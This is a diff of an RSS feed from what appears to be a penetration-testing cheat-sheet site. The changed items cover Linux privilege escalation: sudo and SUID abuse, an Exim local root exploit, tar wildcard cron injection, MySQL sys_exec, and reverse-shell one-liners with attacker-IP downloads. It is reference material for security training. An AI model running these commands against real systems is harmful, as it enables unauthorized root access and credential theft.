@@ -252,7 +252,9 @@ General and Tricks # Classical test &#39; or 1=1 LIMIT 1 -- &#39; or 1=1 LIMIT 1
       
       <guid>/linux-systems/privilege-escalation/system_tricks/</guid>
       <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://marc.info/?l=full-disclosure&amp;amp;m=128776663124692&amp;amp;w=2 
-General &amp;amp; Tricks # Look for strange process ps aux # Look for setuid programs (everyone can run them as root) find / -perm -4000 # Example, if perl perl -e ‘$ENV{PATH}=&amp;#34;/usr/bin&amp;#34;;system(&amp;#34;whoami&amp;#34;);’ → root # Get a TTY shell after a reverse shell connection python -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Set PATH TERM and SHELL if they&amp;#39;re missing export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin export TERM=xterm export SHELL=bash # Add public key to authorized keys echo $(wget https://ATTACKER_IP/.</description>
+/bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root): install -mode 4755 /bin/dash /tmp/sh
+Then you will have a /tmp/sh that gives any user who calls it root ! Some payloads to overcome limited shells ssh user@$ip nc $localip 4444 -e /bin/sh python -c &amp;lsquo;import pty; pty.spawn(&amp;ldquo;/bin/sh&amp;rdquo;)&amp;rsquo; export TERM=linux
+Python python -c &amp;lsquo;import pty; pty.</description>
     </item>
     
     <item>
@@ -314,6 +316,16 @@ OpenSSL # Connection through openssl openssl s_client -connect IP:PORT</descript
       <guid>/cryptography/aes/</guid>
       <description>Retrieve AES Key and mount partition # Dump AES key aeskeyfind dump # Result 8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1 # Mount partition echo 8d3f527de514872f595908958dbc0ed1 | xxd -r -p &amp;gt; key.bin sudo cryptsetup luksFormat --verify-passphrase --cipher=aes-ecb --hash=sha1 --key-size=128 --master-key-file=key.bin dump sudo cryptsetup luksOpen dump test sudo mount -t ext4 /dev/mapper/test /mnt/media sudo ls /mnt/media/dir2 
 Decipher encrypted aes256cbc file using openssl # Key d49af309a4c69382ff07bc6f83ba4c2595a7f086d3e5b69e119e2337cb75172d&amp;#39; ----&amp;gt; SHA-256 de &amp;#39;mcsTnTld1dDn&amp;#39;: # Decipher openssl enc -aes-256-cbc -d -in Confidentiel.</description>
+    </item>
+    
+    <item>
+      <title>Abusing Sudo Rights</title>
+      <link>/linux-systems/privilege-escalation/abusing_sudo_rights/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/privilege-escalation/abusing_sudo_rights/</guid>
+      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://gtfobins.github.io/ 
+Exploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /etc/shadow # You will get an error and it will # display first line   apt-get sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh    awk sudo awk &amp;lsquo;BEGIN {system(&amp;ldquo;/bin/sh&amp;rdquo;)}&amp;rsquo;    ed sudo /usr/bin/ed !/bin/sh    find sudo find /etc/passwd -exec /bin/sh \; sudo find /bin -name nano -exec /bin/sh \;    ftp sudo ftp ftp&amp;gt; /!</description>
     </item>
     
     <item>
@@ -521,16 +533,6 @@ Utilman.exe attack # You can access a SYSTEM cmd shell if you have access to the
     </item>
     
     <item>
-      <title>Services</title>
-      <link>/linux-systems/privilege-escalation/services/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/linux-systems/privilege-escalation/services/</guid>
-      <description> Exim4 # https://www.exploit-db.com/exploits/39535 #!/bin/sh echo [ CVE-2016-1531 local root exploit cat &amp;gt; /tmp/root.pm &amp;lt;&amp;lt; EOF package root; use strict; use warnings; system(&amp;#34;/bin/sh&amp;#34;); EOF PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps 
-MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;usermod -a -G admin username&amp;#39;) Select sys_exec(&amp;#39;whoami&amp;#39;); select sys_exec(&amp;#39;/bin/bash&amp;#39;); Select sys_eval(&amp;#39;whoami&amp;#39;); # MySQL run as root and version is &amp;lt;5 go for User Defined Functions (UDF) # TODO</description>
-    </item>
-    
-    <item>
       <title>Silver and Golden Tickets</title>
       <link>/windows-systems/post-exploitation-techniques/silver_golden_tickets/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -567,16 +569,6 @@ Online DNS tools and services # VirusTotal runs its own passive DNS replication 
       <guid>/recon-enumeration/services-enumeration/25_smtp/</guid>
       <description> Identification # Connection and test using telnet telnet &amp;lt;IP&amp;gt; 25 EHLO &amp;lt;IP&amp;gt; VRFY root EXPN root Mail from: me@test.com To: root@test.com Data: Subject: Message Hi, Just a test message. (Double carriage return) 
 Enumeration # using smtp-user-enum script smtp-user-enum -M VRFY -U users.txt -t &amp;lt;IP&amp;gt;</description>
-    </item>
-    
-    <item>
-      <title>Abusing sudo programs</title>
-      <link>/linux-systems/privilege-escalation/abusing_sudo_programs/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/linux-systems/privilege-escalation/abusing_sudo_programs/</guid>
-      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://gtfobins.github.io/ 
-General Information # Get privileges for users sudo -l /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root): install -mode 4755 /bin/dash /tmp/sh Then you will have a /tmp/sh that gives any user who calls it root ! # Some payloads to overcome limited shells ssh user@$ip nc $localip 4444 -e /bin/sh python -c &amp;#39;import pty; pty.</description>
     </item>
     
     <item>
@@ -718,6 +710,17 @@ Pwndb.py # Tool using onion website http://pwndb2am4tzkvold.onion/ to search lea
     </item>
     
     <item>
+      <title>SUID files</title>
+      <link>/linux-systems/privilege-escalation/suid/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/privilege-escalation/suid/</guid>
+      <description>/usr/bin/cp # cp -- Il cp is SUID, you can copy privilegied files to /tmp and read them cp /etc/shadow /tmp # generate new account openssl passwd -1 -salt username password # Then create a fake /etc/passwd file, upload it to the target and cp wget http://192.168.1.111:8000/passwd cp passwd /etc/passwd 
+/usr/bin/doas # doas cat /etc/doas.conf doas /usr/bin/less /var/log/authlog # Press v to escape vi then :!sh 
+/usr/bin/find # find touch raj find raj -exec &amp;#34;whoami&amp;#34; \; find raj -exec &amp;#34;/bin/sh&amp;#34; \; # another method find /home –exec chmod u+s /usr/bin/wget \; ls –la /usr/bin/wget cat /etc/passwd # then create another etc/passwd file and upload it</description>
+    </item>
+    
+    <item>
       <title>VHOST Scanning</title>
       <link>/recon-enumeration/application-scans/vhost/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -835,6 +838,17 @@ Searching People # Very good and accurtate tool # You can search by name, revers
     </item>
     
     <item>
+      <title>Services</title>
+      <link>/linux-systems/privilege-escalation/services/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/privilege-escalation/services/</guid>
+      <description>Table of Content  Exim4 MySQL Docker Redis LXD  
+Exim4 # https://www.exploit-db.com/exploits/39535 #!/bin/sh echo [ CVE-2016-1531 local root exploit cat &amp;gt; /tmp/root.pm &amp;lt;&amp;lt; EOF package root; use strict; use warnings; system(&amp;#34;/bin/sh&amp;#34;); EOF PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -pswget http://192.168.0.8:8000/raptor_exim_wiz.sh chmod 777 raptor_exim_wiz.sh ./raptor_exim_wiz.sh -m netcat nc -lvvp 4444 
+MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;usermod -a -G admin username&amp;#39;) Select sys_exec(&amp;#39;whoami&amp;#39;); select sys_exec(&amp;#39;/bin/bash&amp;#39;); Select sys_eval(&amp;#39;whoami&amp;#39;); # MySQL run as root and version is &amp;lt;5 go for User Defined Functions (UDF) https://www.</description>
+    </item>
+    
+    <item>
       <title>Spiderfoot</title>
       <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/spiderfoot/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -949,6 +963,16 @@ Usage usage: cmsmap [-f W/J/D] [-F] [-t] [-a] [-H] [-i] [-o] [-E] [-d] [-u] [-p]
       
       <guid>/open-source-intelligence-osint/technical-recon/company_meta/</guid>
       <description>Company Informations # Find informations about a company https://opencorporates.com # Find multiples sites owned by the same individual/company http://www.spyonweb.com https://www.crunchbase.com https://fr.kompass.com/ https://www.infogreffe.fr/ # Jobs https://www.glassdoor.fr/index.htm # Find people based on several websites https://recruitin.net/ # Cadastre FR https://cadastre.gouv.fr # Call for tender → BOAMP https://www.boamp.fr/ # Legal and Financial informations (might not be free for full informations) https://www.societe.com/ # Brands https://www.inpi.fr/fr # Look for reported vulnerabilities https://www.</description>
+    </item>
+    
+    <item>
+      <title>Crontab</title>
+      <link>/linux-systems/privilege-escalation/crontab/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/privilege-escalation/crontab/</guid>
+      <description>Tar wildcard + root cron # If a privilegied script is used to backup something or just uses tar * in a folder you have write access # You can exploit it to gain root access # Create 3 files in the folder touch -- &amp;#34;--checkpoint=1&amp;#34; touch -- “--checkpoint-action=exec=sh\ shell.sh” touch shell.sh # Then put your payload in the shell.sh script (#!/bin/sh) cat /etc/shadow &amp;gt; outfile.txt 
+Exploiting crontab # If a script is running with higher privileges echo &amp;#34;cat /challenge/app-script/ch4/.</description>
     </item>
     
     <item>
